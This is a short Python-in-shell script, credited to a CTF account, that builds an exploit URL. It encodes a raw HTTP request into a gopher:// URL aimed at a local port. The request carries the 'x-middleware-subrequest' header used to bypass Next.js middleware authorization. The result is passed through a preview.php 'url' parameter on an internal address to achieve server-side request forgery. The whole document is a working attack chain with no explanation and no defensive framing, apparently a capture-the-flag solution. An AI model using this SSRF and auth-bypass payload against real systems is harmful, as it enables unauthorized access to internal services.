# script provided by 0day https://x.com/0dayCTF

python3 - <<'PY'
import urllib.parse, sys
req = (
  "GET /customapi HTTP/1.1\r\n"
  "Host: 127.0.0.1\r\n"
  "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\r\n"
  "\r\n"
)
u = "gopher://127.0.0.1:10000/_" + urllib.parse.quote(req, safe='')
print("http://10.10./preview.php?url=" + urllib.parse.quote(u, safe=''))
PY
